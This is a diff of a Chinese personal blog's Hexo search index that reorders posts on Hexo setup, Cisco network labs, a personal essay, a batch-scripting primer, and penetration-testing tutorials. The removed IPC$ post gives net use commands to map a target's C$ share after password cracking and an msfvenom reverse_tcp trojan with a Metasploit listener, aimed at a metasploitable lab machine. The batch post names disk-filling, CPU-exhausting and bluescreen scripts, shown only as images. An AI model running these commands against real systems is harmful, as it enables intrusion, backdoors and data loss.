@@ -193,6 +193,19 @@ sw acc vlan 20</code></pre>]]></content>
       </tags>
   </entry>
   <entry>
+    <title>Hexo调试-1</title>
+    <url>/2020/06/06/2020-6-6/</url>
+    <content><![CDATA[<p>Hexo基本搭建完成</p>
+]]></content>
+      <categories>
+        <category>调试</category>
+      </categories>
+      <tags>
+        <tag>日常</tag>
+        <tag>调试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hexo调试-2</title>
     <url>/2020/06/06/2020-6-6-2/</url>
     <content><![CDATA[<p>现在可以插入图片了！！<img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/c.gif" alt></p>
@@ -233,9 +246,9 @@ sw acc vlan 20</code></pre>]]></content>
       </tags>
   </entry>
   <entry>
-    <title>Hexo调试-1</title>
-    <url>/2020/06/06/2020-6-6/</url>
-    <content><![CDATA[<p>Hexo基本搭建完成</p>
+    <title>Hexo调试-3</title>
+    <url>/2020/06/07/2020-6-7/</url>
+    <content><![CDATA[<p>换了个NexT主题<br>挑了一个比较满意的主题风格<br>忙活了几个小时<br>已经1点了<br>是时候休息了呀</p>
 ]]></content>
       <categories>
         <category>调试</category>
@@ -261,19 +274,6 @@ sw acc vlan 20</code></pre>]]></content>
       </tags>
   </entry>
   <entry>
-    <title>Hexo调试-3</title>
-    <url>/2020/06/07/2020-6-7/</url>
-    <content><![CDATA[<p>换了个NexT主题<br>挑了一个比较满意的主题风格<br>忙活了几个小时<br>已经1点了<br>是时候休息了呀</p>
-]]></content>
-      <categories>
-        <category>调试</category>
-      </categories>
-      <tags>
-        <tag>日常</tag>
-        <tag>调试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hexo调试-6</title>
     <url>/2020/06/08/2020-6-8/</url>
     <content><![CDATA[<p>用了昨天一个晚上晚上，和今天上午几个小时，用GitHub+jsDelivr+PicGo搭建了个免费图床，感觉效果还不错，还弄了个Gitalk 评论模块，挺好看的，有个美中不足的地方，就是要Github登录之后才能评论，不过也好，还世界一片清净。</p>
@@ -287,6 +287,73 @@ sw acc vlan 20</code></pre>]]></content>
       <tags>
         <tag>日常</tag>
         <tag>调试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>批处理编写</title>
+    <url>/2020/06/27/DOS-1/</url>
+    <content><![CDATA[<h1 id="一些基础批处理编写收录"><a href="#一些基础批处理编写收录" class="headerlink" title="一些基础批处理编写收录"></a>一些基础批处理编写收录</h1><ol>
+<li><p><strong>批处理的作用</strong></p>
+<p>自上而下成批的处理每一条命令，直到执行最后一条</p>
+</li>
+<li><p><strong>创建批处理</strong></p>
+<p>批处理文件的扩展名：<strong>.bat</strong></p>
+</li>
+<li><p><strong>基础命令</strong></p>
+<p>@echo off   关闭执行过程</p>
+<p>pause   程序暂停</p>
+<p>title   黑框标题</p>
+<p>echo.   输出空行（仅在批处理中有用）</p>
+<p>ping -n 10 127.0.0.1 &gt;nul   延迟10个ping包后关闭程序</p>
+<p>%变量%   取值</p>
+<p>shutdown    关机</p>
+<p>ntsd   杀死进程</p>
+<p>taskkill   杀死进程</p>
+<p>fsutil file createnew 文件路径 大小   新建文件</p>
+<blockquote>
+<p>例：fsutil file createnew e:\123.txt 40960    //在e:\下建立一个叫123.txt的文件，大小为40kb</p>
+</blockquote>
+<p><strong>:   定义区块(这是冒号)</strong></p>
+<p>可以理解为C语言的{}，可以和<strong>goto（跳转）</strong>配合使用，例：</p>
+<blockquote>
+<p>:1   //区块1</p>
+<p>命令1</p>
+<p>命令2</p>
+<p>:2   //区块2</p>
+<p>命令1</p>
+<p>:3   //区块3</p>
+<p>goto :1   //跳转到区块1</p>
+</blockquote>
+<p><strong>set   定义变量</strong></p>
+<blockquote>
+<p>例：</p>
+<p>set /p a=请输入a的值    </p>
+<p> /p参数定义输入函数，若没有/p  =右边的文本会变成a的值</p>
+</blockquote>
+</li>
+<li><h5 id="一些批处理实例-命令后的-是注释的意思，实际使用请划去"><a href="#一些批处理实例-命令后的-是注释的意思，实际使用请划去" class="headerlink" title="一些批处理实例   命令后的//是注释的意思，实际使用请划去//"></a>一些批处理实例   <strong>命令后的//是注释的意思，实际使用请划去</strong>//</h5><blockquote>
+<p>如果看不懂请配合《DOS基本命令》查看</p>
+</blockquote>
+</li>
+</ol>
+<h5 id="C盘毁灭机"><a href="#C盘毁灭机" class="headerlink" title="C盘毁灭机"></a>C盘毁灭机</h5><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202107.png" alt></p>
+<p><strong>撑死他的硬盘</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202141.png" alt></p>
+<p><strong>死循环爆CPU</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202224.png" alt></p>
+<p><strong>关机小程序(这可能是唯一一个有益的程序)</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202303.png" alt></p>
+<p><strong>蓝屏战士</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202322.png" alt></p>
+<p><strong>恐吓小脚本</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202553.png" alt></p>
+]]></content>
+      <categories>
+        <category>网络空间安全</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>收录</tag>
       </tags>
   </entry>
   <entry>
@@ -442,73 +509,6 @@ sw acc vlan 20</code></pre>]]></content>
 </blockquote>
 <h2 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h2><p>这里用setoolkit更适用，sessions可直观查看存在的后门并进行连接</p>
 <p>关于上传木马文件并诱其运行以及防御措施等方法不再赘述</p>
-]]></content>
-      <categories>
-        <category>网络空间安全</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>收录</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>批处理编写</title>
-    <url>/2020/06/27/DOS-1/</url>
-    <content><![CDATA[<h1 id="一些基础批处理编写收录"><a href="#一些基础批处理编写收录" class="headerlink" title="一些基础批处理编写收录"></a>一些基础批处理编写收录</h1><ol>
-<li><p><strong>批处理的作用</strong></p>
-<p>自上而下成批的处理每一条命令，直到执行最后一条</p>
-</li>
-<li><p><strong>创建批处理</strong></p>
-<p>批处理文件的扩展名：<strong>.bat</strong></p>
-</li>
-<li><p><strong>基础命令</strong></p>
-<p>@echo off   关闭执行过程</p>
-<p>pause   程序暂停</p>
-<p>title   黑框标题</p>
-<p>echo.   输出空行（仅在批处理中有用）</p>
-<p>ping -n 10 127.0.0.1 &gt;nul   延迟10个ping包后关闭程序</p>
-<p>%变量%   取值</p>
-<p>shutdown    关机</p>
-<p>ntsd   杀死进程</p>
-<p>taskkill   杀死进程</p>
-<p>fsutil file createnew 文件路径 大小   新建文件</p>
-<blockquote>
-<p>例：fsutil file createnew e:\123.txt 40960    //在e:\下建立一个叫123.txt的文件，大小为40kb</p>
-</blockquote>
-<p><strong>:   定义区块(这是冒号)</strong></p>
-<p>可以理解为C语言的{}，可以和<strong>goto（跳转）</strong>配合使用，例：</p>
-<blockquote>
-<p>:1   //区块1</p>
-<p>命令1</p>
-<p>命令2</p>
-<p>:2   //区块2</p>
-<p>命令1</p>
-<p>:3   //区块3</p>
-<p>goto :1   //跳转到区块1</p>
-</blockquote>
-<p><strong>set   定义变量</strong></p>
-<blockquote>
-<p>例：</p>
-<p>set /p a=请输入a的值    </p>
-<p> /p参数定义输入函数，若没有/p  =右边的文本会变成a的值</p>
-</blockquote>
-</li>
-<li><h5 id="一些批处理实例-命令后的-是注释的意思，实际使用请划去"><a href="#一些批处理实例-命令后的-是注释的意思，实际使用请划去" class="headerlink" title="一些批处理实例   命令后的//是注释的意思，实际使用请划去//"></a>一些批处理实例   <strong>命令后的//是注释的意思，实际使用请划去</strong>//</h5><blockquote>
-<p>如果看不懂请配合《DOS基本命令》查看</p>
-</blockquote>
-</li>
-</ol>
-<h5 id="C盘毁灭机"><a href="#C盘毁灭机" class="headerlink" title="C盘毁灭机"></a>C盘毁灭机</h5><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202107.png" alt></p>
-<p><strong>撑死他的硬盘</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202141.png" alt></p>
-<p><strong>死循环爆CPU</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202224.png" alt></p>
-<p><strong>关机小程序(这可能是唯一一个有益的程序)</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202303.png" alt></p>
-<p><strong>蓝屏战士</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202322.png" alt></p>
-<p><strong>恐吓小脚本</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202553.png" alt></p>
 ]]></content>
       <categories>
         <category>网络空间安全</category>
@@ -701,6 +701,39 @@ network 192.168.4.0</code></pre><h2 id="结果"><a href="#结果" class="headerl
       </tags>
   </entry>
   <entry>
+    <title>《如果爱了》</title>
+    <url>/2020/06/25/b-1/</url>
+    <content><![CDATA[<h1 id="《如果爱了》"><a href="#《如果爱了》" class="headerlink" title="《如果爱了》"></a>《如果爱了》</h1><h5 id="作者：Oscur"><a href="#作者：Oscur" class="headerlink" title="作者：Oscur"></a>作者：Oscur</h5><h2 id="——序章"><a href="#——序章" class="headerlink" title="——序章"></a>——序章</h2><p>​        我考虑了很久，决定创作这篇文章，或许他是日记，仅为留下记忆，或是纪念，或是录堑，亦或是缅怀。</p>
+<p>​        故事很长，倾心诉说。</p>
+<p>​        之前看到过一个疑问，如果让你重新再来一次，你还会重蹈覆辙吗，或是说，你后悔吗？若让我重新再来，我仍会做相同的选择，且不后悔，但在她身上，我再不想留下任何感情。人生中遇见的每一个人，都是安排好的，他一定有意义，但是这份所谓的意义也可以是“经历”，我不后悔遇见她，我也不后悔和她发生的一切，但我再也不是从前那个我，我把她当教训，亦不是三年前痴痴的卑微，更不是半年前深情的舔狗。室友开玩笑的说我像个“喜剧演员”，我想我更像Joker吧。</p>
+<p>​        因为疫情，高二下学期全部被网课代替，我开始讨厌想起她，厌恶脑海中穿插过关于她的点滴，那种感觉很魔幻，像子弹一样击穿我笨拙的壁垒。每当这个时候我总会用力扇自己一耳光，疼痛总会提醒我，质问我到底变了吗，我还是那个我吗？</p>
+<p>​        我喜欢薛之谦，并不是他的歌好听，或是人长得帅，薛先生的歌总会对我的生活产生极大的共鸣，他在讲述一个悲伤的故事，悲伤却被治愈着。最无力，无奈的一首：</p>
+<p>​        没有《演员》的决裂冷炎</p>
+<p>​        没有《绅士》的进退有度</p>
+<p>​        没有《方圆几里》的执着</p>
+<p>​        没有《其实》的歇斯底里</p>
+<p>只有后知后觉的撕心裂肺，连唱腔都隐隐作痛。</p>
+<p>“我们的爱情到这刚刚好，再不争也不吵不必再煎熬，你可以不用记得我的好。”</p>
+<p>现在却害怕听薛之谦，恰好的三行情书总会无数次挑动我已经麻木的伤口。</p>
+<p>​        <strong>等怂恿的烫了手，等看懂的还我自由</strong></p>
+<p>​        谣言横行，舆论传讹，当局者迷。</p>
+<p>​        在他们眼中，我便是“绿了她”，“为了好玩才谈”，可我是个什么样的人，我想我身边的朋友比我更清楚。元旦时期，她对我不冷不热，爱搭不理，在我对她的闺蜜进行刨问，对她开始“恳求”时，她告诉我，我和我的女部下有不当之交，甚至于“周遭皆明，唯其不知”，“所有人都在瞒着我”，“他们都在劝我分”</p>
+<p>​        体测陪跑？我陪的是整个文体部，怎么就是她一个人了？</p>
+<p>​        手牵手？无中生有加上以讹传讹？</p>
+<p>​        当然，我更不知道女当事人和她为了躲避我QQ关联的消息查看而“创群聊完删”的操作中，到底有什么，我想我最好不想知道。</p>
+<p>​        可能我真的将公私分明做出了极致，在红头文件下偏袒她以前的朋友，在开除处分下挽留她现在的闺蜜，在招新面试中挑选她的同学脱颖而出。工作没有特地安排她和我一组，部门之间没有破坏规矩，全会之下没有鼓起官威。正经的工作居然没有掺杂到任何个人感情，我想我很负责，也很可悲，难道不是吗？副主席？</p>
+<p>​        <strong>如果无奈了，那就放下手，野草一定会出卖墙头。</strong></p>
+<p>​                                                                                                                               ———2020年5月30日 凌晨1:43 著序</p>
+]]></content>
+      <categories>
+        <category>书</category>
+      </categories>
+      <tags>
+        <tag>书</tag>
+        <tag>如果爱了</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Telnet登录提权</title>
     <url>/2020/06/25/Telnet-1/</url>
     <content><![CDATA[<h1 id="Telnet登录破解以及提取最高管理员root权限"><a href="#Telnet登录破解以及提取最高管理员root权限" class="headerlink" title="Telnet登录破解以及提取最高管理员root权限"></a>Telnet登录破解以及提取最高管理员root权限</h1><p>Telnet（Internet<a href="https://baike.baidu.com/item/远程登/2991166" target="_blank" rel="noopener">远程登</a>录服务的标准协议）默认开放于<strong>23端口</strong>。</p>
@@ -779,347 +812,6 @@ shell@msfadmin &gt; ps aux | grep udev  查看pid</code></pre><p><img src="https
 <p>端口监听可能有点慢，需要多等待一会</p>
 </li>
 </ol>
-]]></content>
-      <categories>
-        <category>网络空间安全</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DHCP</title>
-    <url>/2020/06/25/dhcp/</url>
-    <content><![CDATA[<h1 id="网络搭建—DHCP"><a href="#网络搭建—DHCP" class="headerlink" title="网络搭建—DHCP"></a>网络搭建—DHCP</h1><blockquote>
-<p>实验平台: Cisco Packet Tracer 7.3.0</p>
-</blockquote>
-<h4 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/dhcp.png" alt></p>
-<h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><h5 id="DHCP配置"><a href="#DHCP配置" class="headerlink" title="DHCP配置"></a>DHCP配置</h5><p>sw1</p>
-<pre><code>en
-config
-int f0/1
-no sw
-ip add 172.16.1.254 255.255.255.0
-int f0/23
-no sw
-ip add 10.1.1.1 255.255.255.0
-service dhcp
-ip dhcp exc 172.16.1.253 172.16.1.254
-ip dhcp exc 172.16.2.253 172.16.2.254
-ip dhcp pool net1
-network 172.16.1.0 255.255.255.0
-default-router 172.16.1.254
-dns-server 10.1.2.1
-exit
-ip dhcp pool net2
-network 172.16.2.0 255.255.255.0
-default-router 172.16.2.254
-dns-server 10.1.2.1
-exit
-ip route 172.16.2.0 255.255.255.0 10.1.1.2
-ip routing</code></pre><h5 id="DHCP中继"><a href="#DHCP中继" class="headerlink" title="DHCP中继"></a>DHCP中继</h5><p>sw2</p>
-<pre><code>en
-config
-int f0/23
-no sw
-ip add 10.1.1.2 255.255.255.0
-int f0/1
-no sw
-ip add 172.16.2.254 255.255.255.0
-exit
-service dhcp
-int f0/1
-ip helper 10.1.1.1
-exit
-ip routing
-ip route 172.16.1.0 255.255.255.0 10.1.1.1</code></pre><h5 id="DHCP监听"><a href="#DHCP监听" class="headerlink" title="DHCP监听"></a>DHCP监听</h5><p>sw3</p>
-<pre><code>en
-config
-ip dhcp snooping
-int f0/1
-ip dhcp snooping trust</code></pre><p>sw4</p>
-<pre><code>en
-config
-ip dhcp snooping
-int f0/1
-ip dhcp snooping trust</code></pre>]]></content>
-      <categories>
-        <category>网络搭建</category>
-      </categories>
-      <tags>
-        <tag>收录</tag>
-        <tag>网络搭建</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《如果爱了》</title>
-    <url>/2020/06/25/b-1/</url>
-    <content><![CDATA[<h1 id="《如果爱了》"><a href="#《如果爱了》" class="headerlink" title="《如果爱了》"></a>《如果爱了》</h1><h5 id="作者：Oscur"><a href="#作者：Oscur" class="headerlink" title="作者：Oscur"></a>作者：Oscur</h5><h2 id="——序章"><a href="#——序章" class="headerlink" title="——序章"></a>——序章</h2><p>​        我考虑了很久，决定创作这篇文章，或许他是日记，仅为留下记忆，或是纪念，或是录堑，亦或是缅怀。</p>
-<p>​        故事很长，倾心诉说。</p>
-<p>​        之前看到过一个疑问，如果让你重新再来一次，你还会重蹈覆辙吗，或是说，你后悔吗？若让我重新再来，我仍会做相同的选择，且不后悔，但在她身上，我再不想留下任何感情。人生中遇见的每一个人，都是安排好的，他一定有意义，但是这份所谓的意义也可以是“经历”，我不后悔遇见她，我也不后悔和她发生的一切，但我再也不是从前那个我，我把她当教训，亦不是三年前痴痴的卑微，更不是半年前深情的舔狗。室友开玩笑的说我像个“喜剧演员”，我想我更像Joker吧。</p>
-<p>​        因为疫情，高二下学期全部被网课代替，我开始讨厌想起她，厌恶脑海中穿插过关于她的点滴，那种感觉很魔幻，像子弹一样击穿我笨拙的壁垒。每当这个时候我总会用力扇自己一耳光，疼痛总会提醒我，质问我到底变了吗，我还是那个我吗？</p>
-<p>​        我喜欢薛之谦，并不是他的歌好听，或是人长得帅，薛先生的歌总会对我的生活产生极大的共鸣，他在讲述一个悲伤的故事，悲伤却被治愈着。最无力，无奈的一首：</p>
-<p>​        没有《演员》的决裂冷炎</p>
-<p>​        没有《绅士》的进退有度</p>
-<p>​        没有《方圆几里》的执着</p>
-<p>​        没有《其实》的歇斯底里</p>
-<p>只有后知后觉的撕心裂肺，连唱腔都隐隐作痛。</p>
-<p>“我们的爱情到这刚刚好，再不争也不吵不必再煎熬，你可以不用记得我的好。”</p>
-<p>现在却害怕听薛之谦，恰好的三行情书总会无数次挑动我已经麻木的伤口。</p>
-<p>​        <strong>等怂恿的烫了手，等看懂的还我自由</strong></p>
-<p>​        谣言横行，舆论传讹，当局者迷。</p>
-<p>​        在他们眼中，我便是“绿了她”，“为了好玩才谈”，可我是个什么样的人，我想我身边的朋友比我更清楚。元旦时期，她对我不冷不热，爱搭不理，在我对她的闺蜜进行刨问，对她开始“恳求”时，她告诉我，我和我的女部下有不当之交，甚至于“周遭皆明，唯其不知”，“所有人都在瞒着我”，“他们都在劝我分”</p>
-<p>​        体测陪跑？我陪的是整个文体部，怎么就是她一个人了？</p>
-<p>​        手牵手？无中生有加上以讹传讹？</p>
-<p>​        当然，我更不知道女当事人和她为了躲避我QQ关联的消息查看而“创群聊完删”的操作中，到底有什么，我想我最好不想知道。</p>
-<p>​        可能我真的将公私分明做出了极致，在红头文件下偏袒她以前的朋友，在开除处分下挽留她现在的闺蜜，在招新面试中挑选她的同学脱颖而出。工作没有特地安排她和我一组，部门之间没有破坏规矩，全会之下没有鼓起官威。正经的工作居然没有掺杂到任何个人感情，我想我很负责，也很可悲，难道不是吗？副主席？</p>
-<p>​        <strong>如果无奈了，那就放下手，野草一定会出卖墙头。</strong></p>
-<p>​                                                                                                                               ———2020年5月30日 凌晨1:43 著序</p>
-]]></content>
-      <categories>
-        <category>书</category>
-      </categories>
-      <tags>
-        <tag>书</tag>
-        <tag>如果爱了</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Vlan划分</title>
-    <url>/2020/06/25/vlan/</url>
-    <content><![CDATA[<h1 id="网络搭建—VLAN"><a href="#网络搭建—VLAN" class="headerlink" title="网络搭建—VLAN"></a>网络搭建—VLAN</h1><blockquote>
-<p>实验平台: Cisco Packet Tracer 7.3.0</p>
-</blockquote>
-<h2 id="1-VlAN划分"><a href="#1-VlAN划分" class="headerlink" title="1.VlAN划分"></a>1.VlAN划分</h2><h3 id="1-单交换机"><a href="#1-单交换机" class="headerlink" title="(1)单交换机"></a>(1)单交换机</h3><h4 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/i-1.png" alt></p>
-<h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><pre><code>en
-config
-int f0/1
-sw acc vlan 10
-int f0/2
-sw acc vlan 20
-int f0/3
-sw acc vlan 30
-end</code></pre><h3 id="2-双交换机"><a href="#2-双交换机" class="headerlink" title="(2)双交换机"></a>(2)双交换机</h3><h4 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/i2.png" alt></p>
-<h4 id="指令-1"><a href="#指令-1" class="headerlink" title="指令"></a>指令</h4><p>SW 1</p>
-<pre><code>en
-config
-int f0/1
-sw acc vlan 10
-int f0/2
-sw acc vlan 20
-int f0/24
-sw mode trunk
-sw trunk all vlan all
-end</code></pre><p>SW 2</p>
-<pre><code>en
-config
-int f0/1
-sw acc vlan 10
-int f0/2
-sw acc vlan 20
-int f0/24
-sw mode trunk
-sw trunk all vlan all
-end</code></pre><h2 id="2-Vlan间通信"><a href="#2-Vlan间通信" class="headerlink" title="2.Vlan间通信"></a>2.Vlan间通信</h2><h3 id="1-SVI"><a href="#1-SVI" class="headerlink" title="(1)SVI"></a>(1)SVI</h3><h4 id="拓扑-1"><a href="#拓扑-1" class="headerlink" title="拓扑"></a>拓扑</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/ttt.PNG" alt></p>
-<h4 id="指令-2"><a href="#指令-2" class="headerlink" title="指令"></a>指令</h4><pre><code>en
-config
-int vlan 10
-ip add 192.168.1.254 255.255.255.0
-int vlan 20
-ip add 192.168.2.254 255.255.255.0
-exit
-int f0/1
-sw trunk encapsulation dot1q
-sw mode trunk
-ip routing
-end</code></pre><p>二层</p>
-<pre><code>en
-config
-int f0/1
-sw mode trunk
-sw trunk all vlan all
-int f0/2
-sw acc vlan 10
-int f0/4
-sw acc vlan 20</code></pre><h3 id="2-单臂路由"><a href="#2-单臂路由" class="headerlink" title="(2)单臂路由"></a>(2)单臂路由</h3><h4 id="拓扑-2"><a href="#拓扑-2" class="headerlink" title="拓扑"></a>拓扑</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/ccc.PNG" alt></p>
-<h4 id="指令-3"><a href="#指令-3" class="headerlink" title="指令"></a>指令</h4><p>路由</p>
-<pre><code>en 
-config
-int f0/0.1 
-en dot1q 10
-ip add 192.168.1.254 255.255.255.0
-no shutdown 
-int f0/0.2
-en dot1q 20
-ip add 192.168.2.254 255.255.255.0
-no shutdown
-exit 
-int f0/0
-ip routing
-no shutdown
-end</code></pre><p>二层</p>
-<pre><code>en
-config
-int f0/1
-sw mode trunk
-sw trunk all vlan all
-int f0/2
-sw acc vlan 10
-int f0/3
-sw acc vlan 20</code></pre>]]></content>
-      <categories>
-        <category>网络搭建</category>
-      </categories>
-      <tags>
-        <tag>收录</tag>
-        <tag>网络搭建</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>静态路由</title>
-    <url>/2020/06/26/route/</url>
-    <content><![CDATA[<h1 id="网络搭建—静态路由"><a href="#网络搭建—静态路由" class="headerlink" title="网络搭建—静态路由"></a>网络搭建—静态路由</h1><blockquote>
-<p>实验平台: Cisco Packet Tracer 7.3.0</p>
-</blockquote>
-<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/r1-1.png" alt></p>
-<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>R0</p>
-<pre><code>en
-config
-int f0/0
-no shutdown
-ip add 192.168.1.1 255.255.255.0
-int s0/0/0
-no shutdown
-ip add 192.168.3.1 255.255.255.0
-exit
-ip routing
-ip route 192.168.4.0 255.255.255.0 192.168.3.2
-ip route 192.168.2.0 255.255.255.0 192.168.3.2</code></pre><p>R1</p>
-<pre><code>en
-config
-int s0/0/0
-no shutdown
-ip add 192.168.3.2 255.255.255.0
-int s0/0/1
-no shutdown
-ip add 192.168.4.2 255.255.255.0
-exit
-ip routing
-ip route 192.168.1.0 255.255.255.0 192.168.3.1
-ip route 192.168.2.0 255.255.255.0 192.168.4.1</code></pre><p>R2</p>
-<pre><code>en
-config
-int s0/0/0
-no shutdown
-ip add 192.168.4.1 255.255.255.0
-int f0/0
-no shutdown
-ip add 192.168.2.1 255.255.255.0
-exit
-ip routing
-ip route 192.168.1.0 255.255.255.0 192.168.4.2
-ip route 192.168.3.0 255.255.255.0 192.168.4.2</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/r1-2.png" alt></p>
-]]></content>
-      <categories>
-        <category>网络搭建</category>
-      </categories>
-      <tags>
-        <tag>收录</tag>
-        <tag>网络搭建</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ipc$命令管道入侵示例</title>
-    <url>/2020/06/26/ipc$/</url>
-    <content><![CDATA[<h2 id="IPC-入侵示例"><a href="#IPC-入侵示例" class="headerlink" title="IPC$入侵示例"></a>IPC$入侵示例</h2><blockquote>
-<p>IPC$(Internet Process Connection) 是共享 “ 命名管道 “ 的资源，它是为了让<a href="https://baike.baidu.com/item/进程间通信" target="_blank" rel="noopener">进程间通信</a>而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。 IPC$ 是 NT/2000 的一项新功能，它有一个特点，即在同一时间内，两个 IP 之间只允许建立一个连接。 NT/2000 在提供了  ipc$ 功能的同时，在初次<a href="https://baike.baidu.com/item/安装系统" target="_blank" rel="noopener">安装系统</a>时还打开了<a href="https://baike.baidu.com/item/默认共享" target="_blank" rel="noopener">默认共享</a>，即所有的逻辑共享 (c$,d$,e$ …… ) 和系统目录 winnt 或 windows(admin$) 共享。所有的这些，微软的初衷都是为了方便管理员的管理，但在有意无意中，导致了系统安全性的降低。</p>
-</blockquote>
-<p>入侵条件：<strong>拥有对方机器的用户名和密码</strong></p>
-<p>关于破解用户名密码等请参考文章，<strong>这里不再赘述</strong>！</p>
-<p>但是因为ipc$的dos命令登录特殊性，<strong>你甚至可以编写批处理进行暴力破解！</strong></p>
-<p>渗透机：Kali Linux 2019.3版本   WindowsXP</p>
-<p>靶机：metasploitable3-win2k8</p>
-<pre><code>net use \\目标ip\ipc$ 用户密码 /user:用户名   建立空连接
-net use z: \\目标ip\c$ 用户密码 /user:用户名  将对方的C盘映射到自己的Z盘中
-net use \\目标IP\ipc$ /del                  删除一个ipc$连接
-net use z: /del                            删除映射的z盘
-//这些都是DOS命令</code></pre><p>这里在破解到该用户的登录密码后，开始尝试建立空连接</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--1.png" alt></p>
-<p>成功建立了空连接</p>
-<p>这里尝试对对方的磁盘进行映射</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--2.png" alt></p>
-<p>这里看到，对方的C盘已经映射到左下角的Z盘里了</p>
-<p>这里可以轻易访问\读写对方的磁盘</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--3.png" alt></p>
-<h4 id="已经建立了空连接，开始上传木马"><a href="#已经建立了空连接，开始上传木马" class="headerlink" title="已经建立了空连接，开始上传木马"></a><strong>已经建立了空连接，开始上传木马</strong></h4><p>这里利用Kali Linux中Metasploitble生成一个木马文件</p>
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -i 5 -b &apos;0x00&apos; LHOST=渗透机IP    LPORT=渗透机监听端口 -f exe &gt; 木马名.exe   生成木马
-use exploit/multi/handler   定义监听攻击模块
-set payloads windows/meterpreter/reverset_tcp   设置payload
-set lhost IP    设置渗透机ip
-set lport 端口    设置渗透机监听端口
-exploit   开始监听</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--4.png" alt></p>
